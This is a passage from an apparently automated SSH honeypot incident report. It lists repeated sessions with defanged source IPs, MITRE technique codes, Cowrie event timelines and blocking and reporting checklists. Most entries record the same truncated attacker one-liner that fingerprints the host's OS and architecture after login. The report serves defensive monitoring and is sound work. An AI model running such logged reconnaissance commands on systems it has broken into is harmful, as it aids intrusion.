| `2026-07-06 12:05:45` | `cowrie.log.closed` |
| `2026-07-06 12:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e649ae0caa7e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:07 |
| **Last Seen** | 2026-07-06 12:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:07:12` | `cowrie.session.connect` |
| `2026-07-06 12:07:12` | `cowrie.client.version` |
| `2026-07-06 12:07:12` | `cowrie.client.kex` |
| `2026-07-06 12:07:14` | `cowrie.login.success` |
| `2026-07-06 12:07:15` | `cowrie.session.params` |
| `2026-07-06 12:07:15` | `cowrie.command.input` |
| `2026-07-06 12:07:15` | `cowrie.command.input` |
| `2026-07-06 12:07:15` | `cowrie.command.input` |
| `2026-07-06 12:07:15` | `cowrie.command.input` |
| `2026-07-06 12:07:15` | `cowrie.command.input` |
| `2026-07-06 12:07:15` | `cowrie.command.success` |
| `2026-07-06 12:07:15` | `cowrie.command.input` |
| `2026-07-06 12:07:15` | `cowrie.command.input` |
| `2026-07-06 12:07:15` | `cowrie.command.input` |
| `2026-07-06 12:07:15` | `cowrie.command.input` |
| `2026-07-06 12:07:16` | `cowrie.log.closed` |
| `2026-07-06 12:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1537c9d17cee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:07 |
| **Last Seen** | 2026-07-06 12:08 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:07:44` | `cowrie.session.connect` |
| `2026-07-06 12:07:48` | `cowrie.client.version` |
| `2026-07-06 12:07:48` | `cowrie.client.kex` |
| `2026-07-06 12:08:02` | `cowrie.login.success` |
| `2026-07-06 12:08:09` | `cowrie.session.params` |
| `2026-07-06 12:08:09` | `cowrie.command.input` |
| `2026-07-06 12:08:09` | `cowrie.command.input` |
| `2026-07-06 12:08:09` | `cowrie.command.input` |
| `2026-07-06 12:08:09` | `cowrie.command.input` |
| `2026-07-06 12:08:09` | `cowrie.command.input` |
| `2026-07-06 12:08:09` | `cowrie.command.success` |
| `2026-07-06 12:08:09` | `cowrie.command.input` |
| `2026-07-06 12:08:09` | `cowrie.command.input` |
| `2026-07-06 12:08:09` | `cowrie.command.input` |
| `2026-07-06 12:08:09` | `cowrie.command.input` |
| `2026-07-06 12:08:12` | `cowrie.log.closed` |
| `2026-07-06 12:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91b767c05428

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:08 |
| **Last Seen** | 2026-07-06 12:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:08:43` | `cowrie.session.connect` |
| `2026-07-06 12:08:43` | `cowrie.client.version` |
| `2026-07-06 12:08:43` | `cowrie.client.kex` |
| `2026-07-06 12:08:45` | `cowrie.login.success` |
| `2026-07-06 12:08:46` | `cowrie.session.params` |
| `2026-07-06 12:08:46` | `cowrie.command.input` |
| `2026-07-06 12:08:46` | `cowrie.command.input` |
| `2026-07-06 12:08:46` | `cowrie.command.input` |
| `2026-07-06 12:08:46` | `cowrie.command.input` |
| `2026-07-06 12:08:46` | `cowrie.command.input` |
| `2026-07-06 12:08:46` | `cowrie.command.success` |
| `2026-07-06 12:08:46` | `cowrie.command.input` |
| `2026-07-06 12:08:46` | `cowrie.command.input` |
| `2026-07-06 12:08:46` | `cowrie.command.input` |
| `2026-07-06 12:08:46` | `cowrie.command.input` |
| `2026-07-06 12:08:46` | `cowrie.log.closed` |
| `2026-07-06 12:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a33597a2b9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 12:08 |
| **Last Seen** | 2026-07-06 12:08 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:08:46` | `cowrie.session.connect` |
| `2026-07-06 12:08:47` | `cowrie.client.version` |
| `2026-07-06 12:08:47` | `cowrie.client.kex` |
| `2026-07-06 12:08:53` | `cowrie.login.success` |
| `2026-07-06 12:08:57` | `cowrie.session.params` |
| `2026-07-06 12:08:57` | `cowrie.command.input` |
| `2026-07-06 12:08:58` | `cowrie.log.closed` |
| `2026-07-06 12:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05a88ddc55c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:10 |
| **Last Seen** | 2026-07-06 12:10 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:10:03` | `cowrie.session.connect` |
| `2026-07-06 12:10:07` | `cowrie.client.version` |
| `2026-07-06 12:10:07` | `cowrie.client.kex` |
| `2026-07-06 12:10:21` | `cowrie.login.success` |
| `2026-07-06 12:10:28` | `cowrie.session.params` |
| `2026-07-06 12:10:28` | `cowrie.command.input` |
| `2026-07-06 12:10:28` | `cowrie.command.input` |
| `2026-07-06 12:10:28` | `cowrie.command.input` |
| `2026-07-06 12:10:28` | `cowrie.command.input` |
| `2026-07-06 12:10:28` | `cowrie.command.input` |
| `2026-07-06 12:10:28` | `cowrie.command.success` |
| `2026-07-06 12:10:28` | `cowrie.command.input` |
| `2026-07-06 12:10:28` | `cowrie.command.input` |
| `2026-07-06 12:10:28` | `cowrie.command.input` |
| `2026-07-06 12:10:28` | `cowrie.command.input` |
| `2026-07-06 12:10:31` | `cowrie.log.closed` |
| `2026-07-06 12:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22dd532eafe6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:10 |
| **Last Seen** | 2026-07-06 12:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:10:15` | `cowrie.session.connect` |
| `2026-07-06 12:10:15` | `cowrie.client.version` |
| `2026-07-06 12:10:15` | `cowrie.client.kex` |
| `2026-07-06 12:10:17` | `cowrie.login.success` |
| `2026-07-06 12:10:18` | `cowrie.session.params` |
| `2026-07-06 12:10:18` | `cowrie.command.input` |
| `2026-07-06 12:10:18` | `cowrie.command.input` |
| `2026-07-06 12:10:18` | `cowrie.command.input` |
| `2026-07-06 12:10:18` | `cowrie.command.input` |
| `2026-07-06 12:10:18` | `cowrie.command.input` |
| `2026-07-06 12:10:18` | `cowrie.command.success` |
| `2026-07-06 12:10:18` | `cowrie.command.input` |
| `2026-07-06 12:10:18` | `cowrie.command.input` |
| `2026-07-06 12:10:18` | `cowrie.command.input` |
| `2026-07-06 12:10:18` | `cowrie.command.input` |
| `2026-07-06 12:10:18` | `cowrie.log.closed` |
| `2026-07-06 12:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03c2ed5596a7

| Field | Detail |
|---|---|
| **Source IP** | `103.107.159[.]75` |
| **First Seen** | 2026-07-06 12:11 |
| **Last Seen** | 2026-07-06 12:12 |
| **Session Duration** | 71s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:11:05` | `cowrie.session.connect` |
| `2026-07-06 12:11:05` | `cowrie.client.version` |
| `2026-07-06 12:11:05` | `cowrie.client.kex` |
| `2026-07-06 12:11:05` | `cowrie.login.success` |
| `2026-07-06 12:12:16` | `cowrie.session.file_upload` |
| `2026-07-06 12:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.107.159[.]75` to AbuseIPDB if not already reported
- [ ] Block `103.107.159[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1dc2e8aa5e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:11 |
| **Last Seen** | 2026-07-06 12:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:11:45` | `cowrie.session.connect` |
| `2026-07-06 12:11:45` | `cowrie.client.version` |
| `2026-07-06 12:11:45` | `cowrie.client.kex` |
| `2026-07-06 12:11:46` | `cowrie.login.success` |
| `2026-07-06 12:11:48` | `cowrie.session.params` |
| `2026-07-06 12:11:48` | `cowrie.command.input` |
| `2026-07-06 12:11:48` | `cowrie.command.input` |
| `2026-07-06 12:11:48` | `cowrie.command.input` |
| `2026-07-06 12:11:48` | `cowrie.command.input` |
| `2026-07-06 12:11:48` | `cowrie.command.input` |
| `2026-07-06 12:11:48` | `cowrie.command.success` |
| `2026-07-06 12:11:48` | `cowrie.command.input` |
| `2026-07-06 12:11:48` | `cowrie.command.input` |
| `2026-07-06 12:11:48` | `cowrie.command.input` |
| `2026-07-06 12:11:48` | `cowrie.command.input` |
| `2026-07-06 12:11:48` | `cowrie.log.closed` |
| `2026-07-06 12:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddb1929c45f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:12 |
| **Last Seen** | 2026-07-06 12:12 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:12:26` | `cowrie.session.connect` |
| `2026-07-06 12:12:30` | `cowrie.client.version` |
| `2026-07-06 12:12:30` | `cowrie.client.kex` |
| `2026-07-06 12:12:44` | `cowrie.login.success` |
| `2026-07-06 12:12:51` | `cowrie.session.params` |
| `2026-07-06 12:12:51` | `cowrie.command.input` |
| `2026-07-06 12:12:51` | `cowrie.command.input` |
| `2026-07-06 12:12:51` | `cowrie.command.input` |
| `2026-07-06 12:12:51` | `cowrie.command.input` |
| `2026-07-06 12:12:51` | `cowrie.command.input` |
| `2026-07-06 12:12:51` | `cowrie.command.success` |
| `2026-07-06 12:12:51` | `cowrie.command.input` |
| `2026-07-06 12:12:51` | `cowrie.command.input` |
| `2026-07-06 12:12:51` | `cowrie.command.input` |
| `2026-07-06 12:12:51` | `cowrie.command.input` |
| `2026-07-06 12:12:54` | `cowrie.log.closed` |
| `2026-07-06 12:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf2ec89cbdd7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:13 |
| **Last Seen** | 2026-07-06 12:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:13:15` | `cowrie.session.connect` |
| `2026-07-06 12:13:16` | `cowrie.client.version` |
| `2026-07-06 12:13:16` | `cowrie.client.kex` |
| `2026-07-06 12:13:17` | `cowrie.login.success` |
| `2026-07-06 12:13:18` | `cowrie.session.params` |
| `2026-07-06 12:13:18` | `cowrie.command.input` |
| `2026-07-06 12:13:18` | `cowrie.command.input` |
| `2026-07-06 12:13:18` | `cowrie.command.input` |
| `2026-07-06 12:13:18` | `cowrie.command.input` |
| `2026-07-06 12:13:18` | `cowrie.command.input` |
| `2026-07-06 12:13:18` | `cowrie.command.success` |
| `2026-07-06 12:13:18` | `cowrie.command.input` |
| `2026-07-06 12:13:18` | `cowrie.command.input` |
| `2026-07-06 12:13:18` | `cowrie.command.input` |
| `2026-07-06 12:13:18` | `cowrie.command.input` |
| `2026-07-06 12:13:19` | `cowrie.log.closed` |
| `2026-07-06 12:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505ebf7357b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:14 |
| **Last Seen** | 2026-07-06 12:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:14:48` | `cowrie.session.connect` |
| `2026-07-06 12:14:48` | `cowrie.client.version` |
| `2026-07-06 12:14:48` | `cowrie.client.kex` |
| `2026-07-06 12:14:50` | `cowrie.login.success` |
| `2026-07-06 12:14:51` | `cowrie.session.params` |
| `2026-07-06 12:14:51` | `cowrie.command.input` |
| `2026-07-06 12:14:51` | `cowrie.command.input` |
| `2026-07-06 12:14:51` | `cowrie.command.input` |
| `2026-07-06 12:14:51` | `cowrie.command.input` |
| `2026-07-06 12:14:51` | `cowrie.command.input` |
| `2026-07-06 12:14:51` | `cowrie.command.success` |
| `2026-07-06 12:14:51` | `cowrie.command.input` |
| `2026-07-06 12:14:51` | `cowrie.command.input` |
| `2026-07-06 12:14:51` | `cowrie.command.input` |
| `2026-07-06 12:14:51` | `cowrie.command.input` |
| `2026-07-06 12:14:51` | `cowrie.log.closed` |
| `2026-07-06 12:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507f918ab3cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:14 |
| **Last Seen** | 2026-07-06 12:15 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:14:48` | `cowrie.session.connect` |
| `2026-07-06 12:14:52` | `cowrie.client.version` |
| `2026-07-06 12:14:52` | `cowrie.client.kex` |
| `2026-07-06 12:15:05` | `cowrie.login.success` |
| `2026-07-06 12:15:12` | `cowrie.session.params` |
| `2026-07-06 12:15:12` | `cowrie.command.input` |
| `2026-07-06 12:15:12` | `cowrie.command.input` |
| `2026-07-06 12:15:12` | `cowrie.command.input` |
| `2026-07-06 12:15:12` | `cowrie.command.input` |
| `2026-07-06 12:15:12` | `cowrie.command.input` |
| `2026-07-06 12:15:12` | `cowrie.command.success` |
| `2026-07-06 12:15:12` | `cowrie.command.input` |
| `2026-07-06 12:15:12` | `cowrie.command.input` |
| `2026-07-06 12:15:12` | `cowrie.command.input` |
| `2026-07-06 12:15:12` | `cowrie.command.input` |
| `2026-07-06 12:15:15` | `cowrie.log.closed` |
| `2026-07-06 12:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2568468b15e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 12:16 |
| **Last Seen** | 2026-07-06 12:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 12:16:23` | `cowrie.session.connect` |
| `2026-07-06 12:16:23` | `cowrie.client.version` |
| `2026-07-06 12:16:23` | `cowrie.client.kex` |
| `2026-07-06 12:16:24` | `cowrie.login.success` |
| `2026-07-06 12:16:25` | `cowrie.session.params` |
| `2026-07-06 12:16:25` | `cowrie.command.input` |
| `2026-07-06 12:16:25` | `cowrie.command.input` |
| `2026-07-06 12:16:25` | `cowrie.command.input` |
| `2026-07-06 12:16:25` | `cowrie.command.input` |
| `2026-07-06 12:16:25` | `cowrie.command.input` |
| `2026-07-06 12:16:25` | `cowrie.command.success` |
| `2026-07-06 12:16:25` | `cowrie.command.input` |
| `2026-07-06 12:16:25` | `cowrie.command.input` |
| `2026-07-06 12:16:25` | `cowrie.command.input` |
| `2026-07-06 12:16:25` | `cowrie.command.input` |
| `2026-07-06 12:16:25` | `cowrie.log.closed` |
| `2026-07-06 12:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71199df148dc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 12:17 |
| **Last Seen** | 2026-07-06 12:17 |
| **Session Duration** | 24s |
